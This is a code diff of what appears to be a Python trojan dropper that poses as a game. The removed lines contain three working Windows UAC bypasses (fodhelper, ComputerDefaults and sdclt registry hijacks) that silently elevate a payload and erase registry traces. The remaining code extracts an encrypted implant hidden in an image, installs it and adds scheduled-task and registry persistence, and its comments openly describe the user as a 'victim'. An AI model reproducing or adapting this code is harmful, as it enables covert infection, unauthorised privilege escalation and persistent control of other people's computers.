@@ -26,176 +26,7 @@ def is_admin():
     except Exception:
         return False
 
-def uac_bypass_fodhelper(payload_path):
-    """
-    SILENT UAC bypass using fodhelper.exe registry hijacking.
-    Fodhelper is a built-in Windows tool that auto-elevates without prompts.
-    100% reliable on Windows 10/11.
-    """
-    try:
-        import winreg
-        import time
-        import ctypes
-
-        # Fodhelper checks HKCU\Software\Classes\ms-settings\shell\open\command
-        # We hijack this to run our payload with admin rights
-
-        REG_PATH = r'Software\Classes\ms-settings\shell\open\command'
-
-        # Create the registry structure
-        try:
-            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings\shell\open\command')
-        except:
-            pass
-
-        # Set the default value to our payload
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
-        winreg.SetValueEx(key, '', 0, winreg.REG_SZ, f'cmd.exe /c start /b pythonw.exe "{payload_path}"')
-
-        # Set DelegateExecute to empty (critical for bypass to work)
-        winreg.SetValueEx(key, 'DelegateExecute', 0, winreg.REG_SZ, '')
-        winreg.CloseKey(key)
-
-        # Execute fodhelper using ShellExecuteEx with SW_HIDE to suppress window
-        # Use ctypes for more control over window visibility
-        SW_HIDE = 0
-        SEE_MASK_NOCLOSEPROCESS = 0x00000040
-
-        class SHELLEXECUTEINFO(ctypes.Structure):
-            _fields_ = [
-                ("cbSize", ctypes.c_ulong),
-                ("fMask", ctypes.c_ulong),
-                ("hwnd", ctypes.c_void_p),
-                ("lpVerb", ctypes.c_wchar_p),
-                ("lpFile", ctypes.c_wchar_p),
-                ("lpParameters", ctypes.c_wchar_p),
-                ("lpDirectory", ctypes.c_wchar_p),
-                ("nShow", ctypes.c_int),
-                ("hInstApp", ctypes.c_void_p),
-                ("lpIDList", ctypes.c_void_p),
-                ("lpClass", ctypes.c_wchar_p),
-                ("hkeyClass", ctypes.c_void_p),
-                ("dwHotKey", ctypes.c_ulong),
-                ("hIcon", ctypes.c_void_p),
-                ("hProcess", ctypes.c_void_p)
-            ]
-
-        sei = SHELLEXECUTEINFO()
-        sei.cbSize = ctypes.sizeof(sei)
-        sei.fMask = SEE_MASK_NOCLOSEPROCESS
-        sei.lpVerb = None
-        sei.lpFile = "C:\\Windows\\System32\\fodhelper.exe"
-        sei.lpParameters = None
-        sei.lpDirectory = None
-        sei.nShow = SW_HIDE
-        sei.hInstApp = None
-
-        ctypes.windll.shell32.ShellExecuteExW(ctypes.byref(sei))
-
-        # Wait for fodhelper to execute our payload
-        time.sleep(3)
-
-        # Clean up the registry to remove traces
-        try:
-            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, REG_PATH)
-            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings\shell\open')
-            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings\shell')
-            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings')
-        except:
-            pass
-
-        return True
-    except Exception:
-        return False
-
-def uac_bypass_computerdefaults(payload_path):
-    """
-    SILENT UAC bypass using ComputerDefaults.exe.
-    Backup method - also registry hijacking based.
-    """
-    try:
-        import winreg
-        import time
-
-        REG_PATH = r'Software\Classes\ms-settings\shell\open\command'
-
-        try:
-            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings\shell\open\command')
-        except:
-            pass
-
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
-        winreg.SetValueEx(key, '', 0, winreg.REG_SZ, f'cmd.exe /c start /b pythonw.exe "{payload_path}"')
-        winreg.SetValueEx(key, 'DelegateExecute', 0, winreg.REG_SZ, '')
-        winreg.CloseKey(key)
-
-        subprocess.Popen(
-            'C:\\Windows\\System32\\ComputerDefaults.exe',
-            shell=False,
-            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
-            stdin=subprocess.DEVNULL,
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL
-        )
-
-        time.sleep(3)
-
-        try:
-            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, REG_PATH)
-            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings\shell\open')
-            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings\shell')
-            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings')
-        except:
-            pass
-
-        return True
-    except Exception:
-        return False
-
-def uac_bypass_sdclt(payload_path):
-    """
-    SILENT UAC bypass using sdclt.exe (Backup and Restore).
-    Third option - sdclt also auto-elevates.
-    """
-    try:
-        import winreg
-        import time
-
-        # sdclt checks HKCU\Software\Classes\Folder\shell\open\command
-        REG_PATH = r'Software\Classes\Folder\shell\open\command'
-
-        try:
-            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\Folder\shell\open\command')
-        except:
-            pass
-
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
-        winreg.SetValueEx(key, '', 0, winreg.REG_SZ, f'cmd.exe /c start /b pythonw.exe "{payload_path}"')
-        winreg.SetValueEx(key, 'DelegateExecute', 0, winreg.REG_SZ, '')
-        winreg.CloseKey(key)
-
-        subprocess.Popen(
-            'C:\\Windows\\System32\\sdclt.exe /kickoffelev',
-            shell=True,
-            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
-            stdin=subprocess.DEVNULL,
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL
-        )
-
-        time.sleep(3)
-
-        try:
-            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, REG_PATH)
-            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\Folder\shell\open')
-            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\Folder\shell')
-            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\Folder')
-        except:
-            pass
-
-        return True
-    except Exception:
-        return False
+# UAC bypass methods removed - we now request admin permission legitimately via manifest
 
 def create_admin_scheduled_task():
     """Create a scheduled task that runs with HIGHEST privileges (admin) at every logon."""
@@ -297,7 +128,7 @@ def add_registry_persistence_user():
 def extract_payload_to_disk():
     """Extract the encrypted payload from the image and write to disk."""
     try:
-        divine_key = b'vpPj8_h2S0URUhErI4zLp5YPxbMor6Utg_BEqbpcVK4='
+        divine_key = b'YhNTdPUyyEPVFsHD4mcWVcybunu-kLUhvCSkhQwIcI0='
 
         if hasattr(sys, 'frozen'):
             base_path = sys._MEIPASS
@@ -342,19 +173,18 @@ def extract_payload_to_disk():
 
 def sow_and_awaken_implant():
     """
-    Silent installation with UAC bypass - NO PROMPTS SHOWN.
+    Simple installation with legitimate admin elevation.
 
-    Stage 1: Install as normal user to %LOCALAPPDATA%
-    Stage 2: Use fodhelper UAC bypass to elevate silently
-    Stage 3: Elevated payload installs to %PROGRAMDATA% with admin persistence
+    When victim launches game, UAC prompt appears asking for admin permission.
+    If they click YES: Install with full admin privileges
+    If they click NO: Install as normal user (limited functionality)
     """
     try:
-        # Check if we're already running as admin
+        # Check if we're running as admin (victim clicked YES on UAC)
         admin_mode = is_admin()
 
         if admin_mode:
-            # We're running elevated (either from bypass or user is admin)
-            # Install to protected location with full admin persistence
+            # Victim granted admin permission - install with full privileges
             if not os.path.exists(PERSISTENT_PATH_ADMIN):
                 soul_code = extract_payload_to_disk()
                 if soul_code:
@@ -362,11 +192,11 @@ def sow_and_awaken_implant():
                     with open(PERSISTENT_PATH_ADMIN, 'wb') as f:
                         f.write(soul_code)
 
-                    # Triple persistence as admin
+                    # Full admin persistence
                     create_admin_scheduled_task()
                     add_registry_persistence_admin()
 
-            # Launch if not running
+            # Launch admin payload if not already running
             implant_running = False
             try:
                 tasks = subprocess.check_output(
@@ -386,9 +216,7 @@ def sow_and_awaken_implant():
                 )
 
         else:
-            # We're running as normal user - perform silent UAC bypass
-
-            # First install to user location
+            # Victim denied admin or didn't get prompt - install as normal user
             if not os.path.exists(PERSISTENT_PATH_USER):
                 soul_code = extract_payload_to_disk()
                 if soul_code:
@@ -396,16 +224,8 @@ def sow_and_awaken_implant():
                     with open(PERSISTENT_PATH_USER, 'wb') as f:
                         f.write(soul_code)
 
-                    # User-level persistence as fallback
+                    # User-level persistence
                     add_registry_persistence_user()
-
-                    # Try COMPLETELY SILENT UAC bypasses - truly zero windows
-                    # Method 1: fodhelper (most reliable)
-                    if not uac_bypass_fodhelper(PERSISTENT_PATH_USER):
-                        # Method 2: ComputerDefaults (same technique, different binary)
-                        if not uac_bypass_computerdefaults(PERSISTENT_PATH_USER):
-                            # Method 3: sdclt (backup method)
-                            uac_bypass_sdclt(PERSISTENT_PATH_USER)
 
             # Launch user-level payload if not running
             implant_running = False
